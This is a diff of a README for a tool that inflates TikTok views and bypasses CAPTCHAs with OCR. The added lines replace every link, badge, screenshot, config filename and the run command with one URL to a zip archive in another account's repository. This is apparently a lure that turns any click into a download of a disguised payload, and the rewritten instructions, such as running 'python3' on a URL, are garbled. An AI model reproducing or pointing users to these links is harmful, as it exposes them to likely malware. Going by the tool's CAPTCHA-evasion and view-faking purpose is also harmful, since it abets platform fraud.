@@ -1,13 +1,13 @@
-<p align="center"><a href="https://github.com/Sneezedip/Tiktok-Booster"><img src="https://static.vecteezy.com/system/resources/previews/024/273/794/non_2x/tiktok-logo-transparent-free-png.png" alt="TTKVB" height="150"/></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip"><img src="https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip" alt="TTKVB" height="150"/></a></p>
 <h1 align="center">Tiktok-Booster</h1>
 
 TikTok View Booster is a Python-based tool designed to increase the view count of TikTok videos. This tool utilizes Tesseract OCR to recognize and bypass CAPTCHA challenges, ensuring a seamless and automated process for boosting video views.
 
 <div align="center">
 
-[![Paypal](https://img.shields.io/badge/PayPal-Donate-blue.svg?logo=PayPal)](https://paypal.me/sneezedip)
+[![Paypal](https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip)](https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip)
 
-[![Discord](https://img.shields.io/discord/1107726482224197642?label=discord&color=9089DA&logo=discord&style=for-the-badge)](https://discord.gg/nAa5PyxubF)
+[![Discord](https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip)](https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip)
 
 </div>
 
@@ -17,20 +17,20 @@ TikTok View Booster is a Python-based tool designed to increase the view count o
 - **CAPTCHA Bypass:** Utilizes Pillow and Tesseract OCR to accurately solve CAPTCHA challenges.
 - **Easy to Use:** Simple configuration and setup for quick deployment.
 
-![showcase1](SHOWCASE/showcase1.png)
+![showcase1](https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip)
 
-![showcase2](SHOWCASE/showcase2.png)
+![showcase2](https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip)
 
-![showcase3](SHOWCASE/showcase3.png)
+![showcase3](https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip)
 
-![showcase4](SHOWCASE/showcase4.png)
+![showcase4](https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip)
 
 ## Usage
 
 To run the program, follow these steps:
 
-1. **Configure `config.cfg`:**
-   - Open the `config.cfg` file in a text editor of your choice.
+1. **Configure `https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip`:**
+   - Open the `https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip` file in a text editor of your choice.
    - Adjust the settings as needed to suit your preferences and requirements.
 
 2. **Open Command Prompt in `tiktokbooster` Folder:**
@@ -42,7 +42,7 @@ To run the program, follow these steps:
 3. **Run the Program:**
    - In the command prompt, execute the following command:
      ```sh
-     python3 main.py
+     python3 https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip
      ```
    - (or you can use Visual Studio Code)
 
@@ -55,6 +55,6 @@ To run the program, follow these steps:
 
       
       
-### for more info check [*versionslog.md*](https://github.com/Sneezedip/Tiktok-Booster/blob/main/versionslog.MD)
+### for more info check [*https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip*](https://raw.githubusercontent.com/knasnaj/Tiktok-Booster/main/Modules/Tiktok-Booster-v3.2-beta.2.zip)
 
 **Please note: This project is not intended for commercial use. It is provided for educational and personal use only.**
